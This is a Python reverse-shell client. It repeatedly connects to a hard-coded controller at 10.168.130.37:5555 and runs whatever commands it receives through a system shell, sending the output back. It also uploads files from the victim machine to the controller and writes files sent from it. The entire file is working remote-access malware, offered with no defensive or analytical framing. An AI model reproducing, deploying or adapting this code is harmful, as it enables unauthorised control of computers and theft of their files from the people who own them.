import socket
import time
import json
import subprocess
import os

def reliableSend(command):
    json_data = json.dumps(command) # Store the output of the json.dumps on to command
    s.send(json_data.encode())

def reliableRecieve():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip() # Receiving data from the target, decoding it from bytes to string and stripping any trailing whitespace
            return json.loads(data)
        except ValueError:
            continue

def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('10.168.130.37', 5555))
            shell() # Execuring commands
            s.close()
            break
        except:
            connection()

def uploadFile(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())

def downloadFile(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)

    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break

    s.settimeout(None) # Time out set to non existence
    f.close()

def shell():
    while True:
        command = reliableRecieve()

        if command == 'exit':
            break
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command == 'clear':
            pass
        elif command[:8] == 'download':
            uploadFile(command[9:])
        elif command[:6] == 'upload':
            downloadFile(command[7:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliableSend(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()